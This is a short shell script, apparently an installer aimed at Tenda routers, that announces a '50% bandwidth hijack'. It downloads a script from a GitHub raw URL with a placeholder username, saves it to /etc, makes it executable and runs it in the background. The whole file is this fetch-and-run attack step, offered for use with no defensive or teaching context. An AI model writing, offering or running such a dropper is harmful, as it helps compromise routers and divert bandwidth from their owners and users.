#!/bin/sh
echo "[💀] INSTALLING 50% BANDWIDTH HIJACK..."
cd /tmp
wget -q https://raw.githubusercontent.com/YOUR_USER/tenda-hijack/main/tenda_hijack.sh -O /etc/tenda_hijack.sh
chmod +x /etc/tenda_hijack.sh
/etc/tenda_hijack.sh &
echo "[🔥] 50% bandwidth hijack activated!"